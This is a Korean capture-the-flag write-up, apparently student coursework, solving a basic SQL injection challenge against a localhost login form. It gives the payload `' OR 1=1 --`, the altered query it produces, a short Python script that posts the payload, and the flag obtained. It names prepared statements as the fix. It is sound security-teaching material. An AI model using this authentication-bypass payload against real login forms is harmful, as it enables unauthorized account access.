---
track: "web"
week: 1
challenge_name: "SQL Injection 기초"
author: "20241234_홍길동"
date: "2026-04-03"
cl_level: "CL1"
tags: [SQLi, Union-based]
---

# SQL Injection 기초 풀이

## 분석
로그인 폼에서 입력값을 그대로 SQL 쿼리에 삽입하고 있었다.

## 풀이
1. 로그인 폼에 `' OR 1=1 --` 입력
2. SQL 쿼리가 `SELECT * FROM users WHERE id='' OR 1=1 --'` 로 변조됨
3. 관리자 계정으로 로그인 성공

```python
import requests

url = "http://localhost:5000/login"
data = {"username": "' OR 1=1 --", "password": "anything"}
r = requests.post(url, data=data)
print(r.text)
```

## 플래그 / 결과
```
flag{sql_injection_basic_success}
```

## 배운 점
SQL Injection의 기본 원리와 방어 방법(Prepared Statement)을 학습했다.
